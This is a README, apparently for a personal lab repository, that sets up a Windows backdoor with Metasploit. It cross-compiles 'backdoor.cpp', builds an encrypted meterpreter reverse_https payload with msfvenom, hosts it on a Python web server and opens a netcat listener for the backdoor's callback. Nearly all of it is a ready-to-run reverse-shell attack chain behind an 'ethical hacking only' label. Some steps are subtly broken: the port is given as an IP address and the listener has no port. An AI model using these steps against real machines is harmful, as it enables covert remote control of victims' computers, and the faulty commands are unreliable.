# cybersecurity
Cybersecurity Lab Experiences by Fabio Felgueiras

Use this for ethical hacking only 

1- Download

    git clone https://github.com/Blive77/cybersecurity/
    cd cybersecurity
    
2- Compile

    x86_64-w64-mingw32-g++ --static -o backDoorTest.exe backdoor.cpp -fpermissive -lws2_32
    
    
3- Create custom SSL/TLS certificate 
    https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-paranoid-mode.html

    openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \
    -subj "/C=US/ST=Texas/L=Austin/O=Development/CN=www.example.com" \
    -keyout www.example.com.key \
    -out www.example.com.crt && \
    cat www.example.com.key  www.example.com.crt > www.example.com.pem && \
    rm -f www.example.com.key  www.example.com.crt
    
      
4- Config the msfconsole

    msfconsole
    use exploit/multi/handler
    set payload windows/x64/meterpreter/reverse_https
    set HandlerSSLCert www.example.com.pem
    set StagerVerifySSLCert true
    set HandlerSSLCert /home/kali/cybersecurity/www.example.com.pem
    exit
   
    
4- Create the Payload with msfvenom in Kali linux

   In my case:
   - Host IP= 192.168.235.132  
   - Host Port= 192.168.235.132
   - Path To cert file= /home/kali/cybersecurity/www.example.com.pem
      
    msfvenom -p windows/x64/meterpreter/reverse_https lhost=(Host IP) lport=(Host Port) HandlerSSLCert=(Path To cert file) StagerVerifySSLCert=true -f raw > load.bin
    
   
5- Setup the http webserver for Payload download (while in cybersecurity folder)

    python -m http.server
    
5- Open the listner for the backdoor to connect to (using netcat)

    nc -lvvnp
